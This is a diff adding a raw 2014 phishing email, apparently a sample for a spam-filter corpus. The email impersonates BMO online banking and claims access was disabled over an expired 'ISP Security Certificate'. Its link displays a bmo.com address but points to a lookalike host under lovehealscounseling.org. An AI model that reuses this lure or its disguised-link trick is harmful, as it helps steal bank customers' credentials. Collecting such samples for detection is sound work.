@@ -1,0 +1,70 @@
+Delivered-To: em-ca-bruceg@em.ca
+Received: (qmail 8591 invoked from network); 9 Jan 2014 13:51:54 -0000
+Received: from cpanel.doublepizza.net ([67.212.80.173])
+  by churchill.factcomp.com ([24.89.90.248])
+  with ESMTP via TCP; 09 Jan 2014 13:51:54 -0000
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=doublepizza.net; s=default;
+	h=Sender:List-Subscribe:List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:Reply-To:Date:Message-Id:Content-Transfer-Encoding:Content-Type:MIME-Version:From:Subject:To; bh=v36hPM+OzcaOZnnArTYQpHQkiCcc8isZwzBteIcr5ds=;
+	b=UsPl0a7wiWp56WDw8oAv4nqrsxhQMwkdQnaGf+cfMfX0xbV6500II+Jzq5hMGJ889IKESyzUEwMPyOzEdLggOl+m2BojGsXSZ6UXWJAoooyorgpQGS0Voywftmu34EK30z1XokyY3VvU+tuLPx8bBr3U0A0GzrCq8v1FAq45XXc=;
+Received: from localhost ([127.0.0.1]:41332 helo=cpanel.doublepizza.net)
+	by cpanel.doublepizza.net with esmtp (Exim 4.80.1)
+	(envelope-from <customer-bounces@doublepizza.net>)
+	id 1W1G4R-00072n-Ae; Thu, 09 Jan 2014 08:54:51 -0500
+Received: from bigbear.arvixevps.com ([108.175.145.28]:53841)
+	by cpanel.doublepizza.net with esmtps (TLSv1:DHE-RSA-AES256-SHA:256)
+	(Exim 4.80.1) (envelope-from <cable@bigbear.arvixevps.com>)
+	id 1W1G4D-00072b-Pu
+	for customer@doublepizza.net; Thu, 09 Jan 2014 08:54:37 -0500
+Received: from cable by bigbear.arvixevps.com with local (Exim 4.82)
+	(envelope-from <cable@bigbear.arvixevps.com>) id 1W1G4E-0005Bt-Qc
+	for customer@doublepizza.net; Thu, 09 Jan 2014 05:54:38 -0800
+To: customer@doublepizza.net
+Subject: Online Banking Protection Alert
+From: BMO <noreply@bmo.net>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1W1G4E-0005Bt-Qc@bigbear.arvixevps.com>
+Date: Thu, 09 Jan 2014 05:54:38 -0800
+X-AntiAbuse: This header was added to track abuse,
+	please include it with any abuse report
+X-AntiAbuse: Primary Hostname - bigbear.arvixevps.com
+X-AntiAbuse: Original Domain - doublepizza.net
+X-AntiAbuse: Originator/Caller UID/GID - [513 512] / [47 12]
+X-AntiAbuse: Sender Address Domain - bigbear.arvixevps.com
+X-Get-Message-Sender-Via: bigbear.arvixevps.com: authenticated_id: cable/only
+	user confirmed/virtual account not confirmed
+X-BeenThere: customer@doublepizza.net
+X-Mailman-Version: 2.1.15
+Precedence: list
+Reply-To: noreply@bmo.net
+List-Id: <customer_doublepizza.net.doublepizza.net>
+List-Unsubscribe: <http://doublepizza.net/mailman/options/customer_doublepizza.net>,
+	<mailto:customer-request@doublepizza.net?subject=unsubscribe>
+List-Archive: <http://doublepizza.net/pipermail/customer_doublepizza.net/>
+List-Post: <mailto:customer@doublepizza.net>
+List-Help: <mailto:customer-request@doublepizza.net?subject=help>
+List-Subscribe: <http://doublepizza.net/mailman/listinfo/customer_doublepizza.net>,
+	<mailto:customer-request@doublepizza.net?subject=subscribe>
+Errors-To: customer-bounces@doublepizza.net
+Sender: "Customer" <customer-bounces@doublepizza.net>
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - cpanel.doublepizza.net
+X-AntiAbuse: Original Domain - em.ca
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - doublepizza.net
+X-Get-Message-Sender-Via: cpanel.doublepizza.net: acl_c_authenticated_local_user: mailman/mailman
+Content-Length: 865
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD>
+<META content="text/html; charset=unicode" http-equiv=Content-Type>
+<META name=GENERATOR content="MSHTML 8.00.6001.23543"></HEAD>
+<BODY>BMO Online Banking Protection Alert<BR><BR>Your Online Banking 
+services have been disabled for security reasons.<BR><BR>This has happened 
+because your ISP Security Certificate might be expired.<BR><BR>Please access the 
+following link so we can restore your online access.<BR><BR><A 
+href="http://www1.bmo.com.lovehealscounseling.org/">https://www1.bmo.com/onlinebanking/cgi-bin/netbnx/NBmain?restore=1</A><BR><BR>BMO Online 
+Team.<BR><BR>===========================================================================<BR>Please 
+Do Not Reply to this Email. This is a notification-only email that cannot accept 
+incoming replies.<BR><BR></BODY></HTML>
